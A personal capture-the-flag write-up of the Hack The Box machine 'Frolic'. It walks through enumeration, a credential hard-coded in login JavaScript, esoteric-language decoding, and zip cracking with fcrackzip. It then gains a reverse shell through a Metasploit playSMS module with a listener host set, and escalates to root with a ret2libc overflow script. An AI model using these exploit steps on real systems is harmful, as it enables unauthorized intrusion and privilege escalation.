# FROLIC
frolic was a great box that involved a decent amount of binary exploitation(im not the best at this so if you want a more in
depth explanantion i suggest looking at other writeups, im just doing this so i have a record to look back at.)

>Skills involved in this box:
- enumeration 
- A bit of crypto 
- metasploit
- binary exploitation

# USER

After running an nmap scan we can see that there is quite a few ports open but the main ones that we need are 9999.
There is jsut a welcome message for nginx on the main page so we use dirbuster to search for directories, We use a few 
searches so i will just list all the interesting things that i found:
```
/admin
/backup
/dev
/test
/dev/backup/playsms
```
Taking a look at `/admin` We can see that it is a login page. We look into the source code of the site and find `login.js`:
```javascript
var attempt = 3; // Variable to count number of attempts.
// Below function Executes on click of login button.
function validate(){
var username = document.getElementById("username").value;
var password = document.getElementById("password").value;
if ( username == "admin" && password == "superduperlooperpassword_lol"){
alert ("Login successfully");
window.location = "success.html"; // Redirecting to other page.
return false;
}
else{
attempt --;// Decrementing by one.
alert("You have left "+attempt+" attempt;");
// Disabling fields after 3 attempts.
if( attempt == 0){
document.getElementById("username").disabled = true;
document.getElementById("password").disabled = true;
document.getElementById("submit").disabled = true;
return false;
}
}
}
```
One line sticks out the most and that is the `if ( username == "admin" && password == "superduperlooperpassword_lol"){
`
So now we have some creds, `admin:superduperlooperpassword_lol` we login to the login page and get met buy another site.
```
..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?.
```
This is a ciphertext for an langauge called Ook! we find an online decoder for it(i used dcode.fr)
We get teh output:
```
Nothing here check /asdiSIAJJ0QWE9JAS
```
So we check that directory and we find a long base64 string:
```
UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA
```
Decoding this gives a weird output to we decide to decode it into a zip file.
```base64 -d base64.txt > file.zip```
Trying to unzip it shows us that it is password protected so we find a tool that can get us the password from it.
We find a tool called fcrackzip that will do the trick.
```
fcrackzip file.zip -u -D -p /usr/share/wordlists/rockyou.txt
```
After unzipping that we get a file called index.php that contains a long hex string. We decode this from hex and get a base64 string. After decoding that we get a string that appears to be in the language "brainfuck":
```
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..<
```
Of course we use an online decoder to translate this into english and it ourputs `idkwhatispass` We can only assume that this is the password for the playsms page.
We login on playsms with `admin:idkwhatispass` 
We spend a while searching for exploits to gain us a shell, we come accross a metasploit module using searchsploit that will do the trick. Its called `exploit/multi/http/playsms_uploadcsv_exec`
We set the appropriate options:
```
set password idkwhatispass
set rport 9999
set rhosts 10.10.10.111
set targeturi /playsms
set lhost {your tun0 ip}
exploit
```
We now get a shell as www-data and manage to read the user flag.

# ROOT

We find an SUID binary in /home/ayush/.binary, its called rop
we run it to see what it does, basically it just takes our input and outputs it. 
We do:
```
./rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
And we see that it returns a seg fault so we have a buffer overflow vulnerability.
We are going to do a ret2libc attack.
GDB is not installed on the box so we download a static version and then upload it via a metpreter session.
Theses are the exploitation steps:
```
on our box: 
gdb-peda$ pattern_create -l 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb rop
break *main
run AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
c
we get an address below the line that says segfault.
gdb-peda$ pattern_offset -q address_we_got
we will get an offset of 52
```
This shows us that the buffer overflows at 52 chars
Now we need to get all the addresses so we will start with finding the /bin/sh in libc
```
www-data@frolic:/home/ayush/.binary$ ldd rop 
        linux-gate.so.1 =>  (0xb7fda000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)    <-- this!
        /lib/ld-linux.so.2 (0xb7fdb000)
        
www-data@frolic:/home/ayush/.binary$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
 15ba0b /bin/sh
Also in gdb we do "p system" and "p exit" to find the addresses for system and exit 
 ```
So now we have all our addresses:
```
libc = 0xb7e19000
offset = 0x0015ba0b
/bin/sh = libc + offset = 0xb7f74a0b
system = 0xb7e53da0
exit = 0xb7e479d0
```
Now we have everything we need lets construct our script
```python
#!/usr/bin/python

import struct

buf = "A" * 52
system = struct.pack("I" ,0xb7e53da0)
exit = struct.pack("I" ,0xb7e479d0)
shell = struct.pack("I" ,0xb7f74a0b)
print buf + system + exit + shell
```
Then we simply run This command to exploit the binary and get a root shell and read the root flag:
```
./rop `python /tmp/exploit.py`
```
Thanks for reading and if you enjoyed make sure to check out my profile at 
https://www.hackthebox.eu/home/users/profile/246314


